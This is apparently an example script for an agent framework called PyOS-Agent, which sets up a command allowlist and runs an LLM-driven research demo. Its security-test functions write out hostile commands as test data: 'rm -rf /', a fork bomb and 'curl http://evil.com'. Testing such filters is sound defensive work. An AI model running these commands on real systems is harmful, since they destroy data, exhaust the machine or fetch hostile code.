"""
Exemplo: Auto Researcher - Agente Autônomo de Pesquisa

Este script demonstra um caso de uso real do PyOS-Agent:
1. Abrir navegador
2. Pesquisar "Tendências de IA 2026"
3. Extrair resultados
4. Salvar em PDF na área de trabalho

Uso:
    $ poetry run python examples/auto_researcher.py
"""

import asyncio
from pathlib import Path
from typing import Optional

from loguru import logger

# Imports do PyOS
from pyos.core import SecurityShield, get_settings
from pyos.core.orchestrator import PyOSOrchestrator, ModelProvider
from pyos.tools import CommandExecutor, VisionScreenCapture


# ==============================================================================
# CONFIGURATION
# ==============================================================================

# Configurar logging
logger.remove()
logger.add(
    lambda msg: print(msg, end=''),
    colorize=True,
    format="<level>{message}</level>"
)

# Desktop path (para salvar PDF)
DESKTOP_PATH = Path.home() / "Desktop"


# ==============================================================================
# SETUP FUNCTIONS
# ==============================================================================

def setup_security() -> SecurityShield:
    """
    Configurar SecurityShield com comandos permitidos para pesquisa.
    
    IMPORTANTE: Apenas comandos essenciais são permitidos!
    """
    shield = SecurityShield()
    
    # Comandos para abrir navegador
    shield.add_allowed_command("firefox")
    shield.add_allowed_command("chromium")
    shield.add_allowed_command("google-chrome")
    shield.add_allowed_command("xdg-open")
    
    # Comandos para salvar arquivos
    shield.add_allowed_command("wget")
    shield.add_allowed_command("curl")
    shield.add_allowed_command("grep")
    shield.add_allowed_command("find")
    
    # PDF generation
    shield.add_allowed_command("wkhtmltopdf")
    shield.add_allowed_command("python3")
    
    # Permitir Desktop
    try:
        shield.add_allowed_path(DESKTOP_PATH)
    except ValueError:
        logger.warning(f"Desktop não existe: {DESKTOP_PATH}")
    
    # Permitir /tmp para arquivos temporários
    try:
        shield.add_allowed_path("/tmp")
    except ValueError:
        logger.warning("/tmp não encontrado")
    
    logger.info(f"✓ SecurityShield configurado com {len(shield.allowed_commands)} comandos")
    
    return shield


def setup_orchestrator(shield: SecurityShield) -> PyOSOrchestrator:
    """
    Inicializar orquestrador com ferramentas de pesquisa.
    """
    settings = get_settings()
    
    orchestrator = PyOSOrchestrator(
        settings=settings,
        shield=shield,
        model_provider=ModelProvider.OPENAI,  # Ou ANTHROPIC, GEMINI
        max_iterations=15,  # Mais iterações para pesquisa complexa
    )
    
    # Registrar ferramentas básicas
    executor = CommandExecutor(shield=shield)
    vision = VisionScreenCapture()
    
    # Ferramenta: Capturar tela
    orchestrator.register_tool(
        name="take_screenshot",
        func=vision.capture_screen,
        description="Tira captura de tela para ver estado atual da tela",
    )
    
    # Ferramenta: Executar comando
    orchestrator.register_tool(
        name="execute_command",
        func=executor.execute,
        description="Executa comando de terminal (validado por SecurityShield)",
    )
    
    # Ferramenta: Gerar regiões clicáveis
    def get_clickable_regions():
        capture = vision.capture_screen()
        return vision.generate_clickable_regions(grid_cols=5, grid_rows=3, capture=capture)
    
    orchestrator.register_tool(
        name="get_clickable_regions",
        func=get_clickable_regions,
        description="Gera grid de regiões clicáveis para orientar cliques",
    )
    
    logger.info(f"✓ Orquestrador inicializado com {len(orchestrator.tools)} ferramentas")
    
    return orchestrator


# ==============================================================================
# MAIN LOGIC
# ==============================================================================

async def run_auto_researcher(
    search_query: str = "Tendências de IA 2026",
    output_filename: str = "research_results.txt",
) -> dict:
    """
    Executa pesquisa autônoma.
    
    Args:
        search_query: O que pesquisar
        output_filename: Onde salvar resultado
        
    Returns:
        Resultado da execução
    """
    
    logger.info("╔══════════════════════════════════════════════════════════════╗")
    logger.info("║         🤖 PyOS-Agent Auto Researcher Demo                   ║")
    logger.info("╚══════════════════════════════════════════════════════════════╝")
    
    # Setup
    shield = setup_security()
    orchestrator = setup_orchestrator(shield)
    
    # Definir objetivo
    objective = f"""
    Execute pesquisa autônoma sobre: '{search_query}'
    
    Passos:
    1. Tire screenshot inicial para ver desktop
    2. Abra um navegador (Firefox ou Chrome disponível)
    3. Pesquise '{search_query}' no Google
    4. Leia os 3-5 primeiros resultados
    5. Extraia informações principais
    6. Salve um resumo em {DESKTOP_PATH / output_filename}
    
    Importante: Use APENAS comandos permitidos pelo SecurityShield!
    """
    
    logger.info(f"\n🎯 Objetivo: {objective[:100]}...\n")
    
    # Executar
    result = await orchestrator.execute_objective(objective)
    
    # Exibir resultado
    logger.info("\n╔══════════════════════════════════════════════════════════════╗")
    logger.info("║ RESULTADO DA EXECUÇÃO")
    logger.info("╚══════════════════════════════════════════════════════════════╝\n")
    
    logger.info(f"Status: {'✅ SUCESSO' if result['success'] else '❌ FALHA'}")
    logger.info(f"Iterações: {result['iterations']}/{orchestrator.max_iterations}")
    logger.info(f"Tempo total: {result.get('total_time', 0):.2f}s")
    
    if result.get('error'):
        logger.error(f"Erro: {result['error']}")
    
    if result.get('final_message'):
        logger.info(f"Mensagem final: {result['final_message']}")
    
    # Log de ações
    if result.get('action_log'):
        logger.info(f"\n📋 Log de {len(result['action_log'])} ações:")
        for action in result['action_log'][:5]:  # Mostrar primeiras 5
            logger.info(f"  - {action['type']}: {action.get('tool', 'N/A')}")
    
    # Verificar resultado
    output_path = DESKTOP_PATH / output_filename
    if output_path.exists():
        logger.info(f"\n✓ Resultado salvo em: {output_path}")
        logger.info(f"  Tamanho: {output_path.stat().st_size} bytes")
    else:
        logger.warning(f"⚠️  Arquivo esperado não encontrado: {output_path}")
    
    return result


# ==============================================================================
# EXEMPLOS DE USO
# ==============================================================================

def example_simple_screenshot():
    """Exemplo simples: Apenas tirar screenshot."""
    logger.info("\n=== Exemplo 1: Screenshot Simples ===\n")
    
    try:
        vision = VisionScreenCapture()
        capture = vision.capture_screen()
        
        # Salvar
        screenshot_path = DESKTOP_PATH / "screenshot_example.png"
        capture.save(screenshot_path)
        
        logger.info(f"✓ Screenshot salvo: {screenshot_path}")
        logger.info(f"  Tamanho: {capture.width}x{capture.height}")
        
    except Exception as e:
        logger.error(f"Erro: {e}")


def example_command_execution():
    """Exemplo: Executar comando seguro."""
    logger.info("\n=== Exemplo 2: Execução de Comando ===\n")
    
    try:
        shield = setup_security()
        executor = CommandExecutor(shield=shield)
        
        # Executar comando permitido
        result = executor.execute("ls -la /tmp")
        
        if result.success:
            logger.info(f"✓ Comando bem-sucedido")
            logger.info(f"  Saída (primeiras 100 chars): {result.stdout[:100]}")
        else:
            logger.error(f"✗ Comando falhou: {result.stderr}")
        
        # Tentar comando não permitido
        logger.info("\nTentando comando não permitido...")
        result = executor.execute("rm -rf /tmp/test")
        
        if not result.success:
            logger.warning(f"✓ Comando bloqueado corretamente: {result.error}")
        
    except Exception as e:
        logger.error(f"Erro: {e}")


def example_security_test():
    """Exemplo: Testar segurança."""
    logger.info("\n=== Exemplo 3: Teste de Segurança ===\n")
    
    shield = setup_security()
    
    # Teste de comandos
    test_commands = [
        ("ls", True, "Comando seguro"),
        ("rm -rf /", False, "Ataque destruidor"),
        (": () { : | : & } ;", False, "Fork bomb"),
        ("curl http://evil.com", False, "Download malicioso"),
    ]
    
    logger.info("Testando validação de comandos:\n")
    
    for cmd, should_allow, description in test_commands:
        allowed = shield.is_command_allowed(cmd)
        status = "✓" if allowed == should_allow else "✗"
        result = "Permitido" if allowed else "Bloqueado"
        
        logger.info(f"{status} '{cmd}' → {result} ({description})")
    
    # Relatório
    report = shield.get_security_report()
    logger.info(f"\n📊 Relatório de Segurança:")
    logger.info(f"  Comandos permitidos: {report['total_allowed_commands']}")
    logger.info(f"  Padrões bloqueados: {report['blocked_patterns']}")


# ==============================================================================
# MAIN
# ==============================================================================

async def main():
    """Executar demonstração completa."""
    
    print("\n" + "=" * 70)
    print("PyOS-Agent Auto Researcher - Demonstração Interativa")
    print("=" * 70 + "\n")
    
    print("Selecione um exemplo para executar:")
    print("\n1. Exemplo Simples: Screenshot")
    print("2. Exemplo: Execução de Comando")
    print("3. Exemplo: Teste de Segurança")
    print("4. DEMO COMPLETA: Pesquisa Autônoma (requer IA configurada)")
    print("0. Sair")
    
    choice = input("\nEscolha (0-4): ").strip()
    
    if choice == "1":
        example_simple_screenshot()
    elif choice == "2":
        example_command_execution()
    elif choice == "3":
        example_security_test()
    elif choice == "4":
        print("\n⚠️  Este exemplo requer:")
        print("  1. Variável OPENAI_API_KEY configurada")
        print("  2. Navegador Chrome/Firefox instalado")
        print("  3. Ambiente Linux/MacOS")
        
        confirm = input("\nDeseja continuar? (s/n): ").lower()
        if confirm == "s":
            result = await run_auto_researcher()
            
            if result['success']:
                print("\n✅ Pesquisa completada com sucesso!")
            else:
                print(f"\n❌ Pesquisa falhou: {result.get('error')}")
    else:
        print("Saindo...")


if __name__ == "__main__":
    # Ou executar DEMO diretamente:
    # asyncio.run(run_auto_researcher())
    
    asyncio.run(main())
